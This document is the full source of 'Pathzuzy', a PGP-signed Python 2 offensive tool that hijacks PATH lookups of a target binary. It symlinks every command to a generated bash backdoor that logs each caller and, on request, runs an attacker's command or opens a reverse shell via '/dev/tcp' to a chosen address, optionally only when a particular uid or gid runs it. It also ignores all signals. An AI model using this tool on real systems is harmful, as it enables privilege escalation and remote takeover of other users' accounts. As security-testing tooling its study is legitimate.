#!/usr/bin/env python
"""
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

I'm ShotokanZH on keybase.io -> https://keybase.io/shotokanzh
PGP key: https://keybase.io/shotokanzh/key.asc
To verify the signature run:
    curl https://keybase.io/shotokanzh/key.asc | gpg --import
    gpg --verify pathzuzy.py
"""
import argparse
import curses
from distutils.spawn import find_executable
import os
import shutil
import signal
import socket
import subprocess
import sys
import tempfile

class Pathzuzy(object):
    #constants
    CVER = "0.1.3"
    CRED = '\033[31m'
    CGRN = '\033[32m'
    CYEL = '\033[33m'
    CRST = '\033[0m'
    C_OK = CGRN+"[+]"+CRST
    C_KO = CRED+"[-]"+CRST
    CINF = CYEL+"[i]"+CRST
    CERR = CRED+"[!]"+CRST
    CBANN = CGRN+"""
    _____      _   _                            __
   / / _ \__ _| |_| |__  _____   _ _____   _   / /
  / / /_)/ _` | __| '_ \|_  / | | |_  / | | | / / 
 / / ___/ (_| | |_| | | |/ /| |_| |/ /| |_| |/ /  
/_/\/    \__,_|\__|_| |_/___|\__,_/___|\__, /_/   
                                       |___/   v"""+CVER+CRST+"\n"
    #variables
    verbose = False
    executable = None
    target = None
    args = []
    revsh = {}
    uid_gid = {'uid':None,'gid':None}
    dirs = {'main':None,'link':None,'lock':None}
    timeout = 0

    def __init__(self):
        print "%s" % (self.CBANN)
        self._sig_ignore()
        self.main()
    
    def __del__(self):
        if self.dirs is not {}:
            print "%s Cleaning up.." % (self.CINF)
            if self.verbose:
                print "%s Removing main dir: %s..." % (self.CINF,self.dirs['main'])
            shutil.rmtree(self.dirs['main'])
        return self

    def main(self):
        self.dirs['main'] = tempfile.mkdtemp('','pathzuzy-')
        os.rmdir(self.dirs['main'])
        os.mkdir(self.dirs['main'],0777)

        self.dirs['link'] = "%s/link/" % (self.dirs['main'])
        self.dirs['lock'] = "%s/lock/" % (self.dirs['main'])
        os.mkdir(self.dirs['link'],0777)
        os.mkdir(self.dirs['lock'],0777)

        self._handle_args()
        bd = self._gen_backdoor()

        bdf = self.dirs['main']+"/bd.sh"
        f = open(bdf,'w')
        f.write(bd)
        f.close()
        os.chmod(bdf,0777)

        self._make_links(bdf)

        jargs = ' '.join(self.args)

        self._print_line()
        if self.timeout <= 0:
            os.system("readonly PATH='%s'; export PATH; '%s' %s" % (self.dirs['link'],self.target,jargs))
        else:
            tex = find_executable('timeout')
            if tex == None:
                tex = find_executable('ulimit')
                tex = "%s -t" % (tex)
                os.system("(readonly PATH='%s'; export PATH; %s %d; '%s' %s)" % (self.dirs['link'],tex,self.timeout,self.target,jargs))                
            else:
                os.system("(readonly PATH='%s'; export PATH; %s %d '%s' %s)" % (self.dirs['link'],tex,self.timeout,self.target,jargs))
                
        self._print_line()

        logfile = self.dirs['main']+"/logfile.txt"
        try:
            f = open(logfile)
            print "%s Target was vulnerable! Printing: %s" % (self.C_OK,logfile)
            print f.read()
            f.close()
        except Exception, e:
            print "%s Target was not vulnerable.." % (self.C_KO)
            pass

    def _print_line(self):
        scr = curses.initscr()
        rows, columns = scr.getmaxyx()
        curses.endwin()
        columns = int(columns)
        spath = "PATHZUZY"
        hc = int((columns - len(spath)) / 2)
        line = "="*hc+spath+"="*hc
        print ""
        print "%s%s%s" % (self.CGRN,line,self.CRST)

    def _make_links(self, bdf):
        path = os.environ['PATH']
        for d in path.split(':'):
            print "%s Infecting %s..." % (self.CINF,d)
            for e in os.listdir(d):
                if not os.path.isfile(self.dirs['link']+e):
                    if self.verbose:
                        sys.stdout.write("\r\033[K%s\t%s" % (self.CINF,e))
                        sys.stdout.flush()
                    os.symlink(bdf,self.dirs['link']+e)
            if self.verbose:
                print ""

    def _gen_backdoor(self):
        bashscript = """#!%BASH%
PATH='%PATH%';
SPATH='%SPATH%';
scriptname="$(basename "$0")";
echo "$(whoami)#$(id -u):$(id -g) RUN: $scriptname $@" >> "%LOGFILE%";
chmod 777 "%LOGFILE%" 2>/dev/null;
script="$(which "$scriptname")";
%INJ%
PATH="$SPATH";
"$script" $@;
"""
        bash = find_executable('bash')
        logfile = self.dirs['main']+"/logfile.txt"
        print "%s Logfile: %s" % (self.CINF,logfile)
        inj = ""
        ugid = ""
        if self.revsh != {} or self.executable is not None:

            if self.uid_gid['uid'] != None:
                ugid = '[ "$(id -u)" == "%d" ] && ' % (self.uid_gid['uid'])
            if self.uid_gid['gid'] != None:
                ugid = '%s[ "$(id -g)" == "%d" ] && '% (ugid,self.uid_gid['gid'])

        if self.revsh != {}:
            inj = "\nif %s mkdir \"%s/pathzuzu_rev_lock\" 2>/dev/null;\n" % (ugid,self.dirs['lock'])
            inj = "%sthen\n" % (inj)
            inj = "%s\tchmod 777 \"%s/pathzuzu_rev_lock\";\n" % (inj,self.dirs['lock'])
            inj = "%s\tnohup bash -i >& /dev/tcp/%s/%d 0>&1 &\n" % (inj,self.revsh['ip'],self.revsh['port'])
            inj = "%sfi;\n" % (inj)
        else:
            inj = "\n"

        if self.executable is not None:
            inj = "%sif %s mkdir \"%s/pathzuzu_exe_lock\" 2>/dev/null;\n" % (inj,ugid,self.dirs['lock'])
            inj = "%sthen\n" % (inj)
            inj = "%s\tchmod 777 \"%s/pathzuzu_exe_lock\";\n" % (inj,self.dirs['lock'])
            inj = "%s\tnohup %s &\n" % (inj,self.executable)
            inj = "%sfi;\n" % (inj)

        bashscript = bashscript.replace("%BASH%",bash)
        bashscript = bashscript.replace("%PATH%",os.environ['PATH'])
        bashscript = bashscript.replace("%SPATH%",self.dirs['link'])
        bashscript = bashscript.replace("%LOGFILE%",logfile)
        bashscript = bashscript.replace("%INJ%",inj)

        return bashscript

    def _sig_handle(self, sig, i=None):
        return True

    def _sig_ignore(self):
        for i in [x for x in dir(signal) if x.startswith("SIG")]:
            try:
                signum = getattr(signal,i)
                signal.signal(signum,self._sig_handle)
            except Exception, e:
                continue

    def set_verbose(self, verbose):
        if verbose:
            self.verbose = True
            print "%s Verbose: ON" % (self.CINF)
        else:
            self.verbose = False

    def _handle_args(self):
        parser = argparse.ArgumentParser()
        parser.add_argument("argv",help="binary to check for PATH substitution vulnerabilities & (optional) arguments.",nargs="+",metavar="ARGV")
        parser.add_argument("-e","--execute",help="executes command CMD if target is vulnerable",metavar="CMD")
        parser.add_argument("-r","--reverse",help="spawns reverse shell to ADDR:PORT",nargs=2,metavar=("ADDR","PORT"))
        if find_executable('timeout') is None:
            parser.add_argument("-t","--timeout",help="timeout (seconds) limits cpu time on TARGET. (ulimit -t)",type=int,metavar="SEC")
        else:
            parser.add_argument("-t","--timeout",help="timeout (seconds) kills TARGET after SEC seconds (timeout)",type=int,metavar="SEC")
        parser.add_argument("-g","--gid",help="runs command/shell only if the group is GRP (requires: -r or -e)",type=int,metavar="GRP")
        parser.add_argument("-u","--uid",help="runs command/shell only if the user is USR (requires: -r or -e)",type=int,metavar="USR")
        parser.add_argument("-v","--verbose",help="verbose",action="store_true")
        args = parser.parse_args()

        if len(sys.argv) < 2:
            parser.print_usage()
            sys.exit(1)
        
        if args.verbose:
            self.set_verbose(True)

        if args.timeout is not None:
            self.timeout = int(args.timeout)
            if self.verbose:
                print "%s Timeout set to %d second(s)." % (self.CINF,self.timeout)

        if args.argv is not None:
            exe = find_executable(args.argv[0])
            if exe != None:
                self.target = exe
                self.args = args.argv
                self.args.pop(0)
                if self.verbose:
                    print "%s Target is: %s" % (self.CINF,self.target)
                    print "%s Args are: %s" % (self.CINF,self.args)
            else:
                print "%s Target is an invalid exe: %s" % (self.CERR,args.argv[0])
                sys.exit(1)

        if args.execute is not None or args.reverse is not None:
            if args.gid is not None and args.gid >= 1:
                self.uid_gid['gid'] = args.gid
            if args.uid is not None and args.uid >= 1:
                self.uid_gid['uid'] = args.uid
            if self.verbose:
                print "%s uid_gid: %s" % (self.CINF,self.uid_gid)

        if args.execute is not None:
            if self.verbose:
                print "%s Flag -e will run: %s" % (self.CINF,args.execute)
            self.executable = "%s" % (args.execute)
        
        if args.reverse is not None:
            try:
                ip = socket.gethostbyname(args.reverse[0])
                port = int(args.reverse[1])
                if port < 1 or port > 65535:
                    print "%s Flag -r" % (self.CINF)
                    print "%s Error: port should be between 1 and 65535!"
                    sys.exit(1)
                if self.verbose:
                    print "%s Reverse shell > %s:%d" % (self.CINF,ip,port)
                self.revsh = {"ip":ip,"port":port}
            except Exception, e:
                print "%s Flag -r" % (self.CINF)
                print "%s %s" % (self.CERR,e)
                sys.exit(1)

if __name__ == "__main__":
    p = Pathzuzy()

"""
-----BEGIN PGP SIGNATURE-----
Version: Keybase OpenPGP v2.0.66
Comment: https://keybase.io/crypto

wsBcBAABCgAGBQJY0p/nAAoJEAFLBXGDc4xOAXwH/2VbDgsVSdKIq8w98eS0NPlA
hWERkLFjKjYRuvTMJEUrnOXkR8Td8Gf4tgbFI3+1tt74iZ9BQKWrYMXeHjEMJxVx
n3hkDqSl4+7gGklPre3gJdoB4Jj1TfdQFxkT9VY2AWSp8EYAEbacf4PeJYfhtxwl
KF4oJjJc0TtzpkTUOvspgCIOOz7iD5lzBR1N0mpi1+/CcPDwL0LyGTYGsEO9HwuV
r0cOay9canjgZ4T3OG4+8wjXxjbMylHnvoadbAGxcUg2bcL5iCE9xzn1wQ7Y0nlS
3xofMB3khH8nbJO19iCNZUZ87fgAZOifeTkrQAcG1lbiMkdNFMB5iaEope1XR48=
=eF3E
-----END PGP SIGNATURE-----
"""
